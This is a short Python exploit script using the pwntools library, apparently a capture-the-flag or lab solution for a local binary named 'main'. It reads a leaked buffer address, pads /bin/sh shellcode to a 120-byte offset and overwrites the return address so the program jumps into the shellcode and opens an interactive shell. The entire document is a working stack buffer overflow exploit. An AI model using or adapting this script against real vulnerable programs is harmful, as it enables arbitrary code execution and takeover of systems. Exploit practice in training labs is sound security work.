#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF("./main")
libc = elf.libc

p = process(elf.path)

p.recvuntil(b"Buf address: ")
buf_addr = int(p.recvline().strip(), 16)

log.info(f"Buffer address: {hex(buf_addr)}")

offset =  120 # find with cyclic pattern
shellcode = asm(shellcraft.sh())
p.send(shellcode.ljust(offset, b"A") + p64(buf_addr))

p.interactive()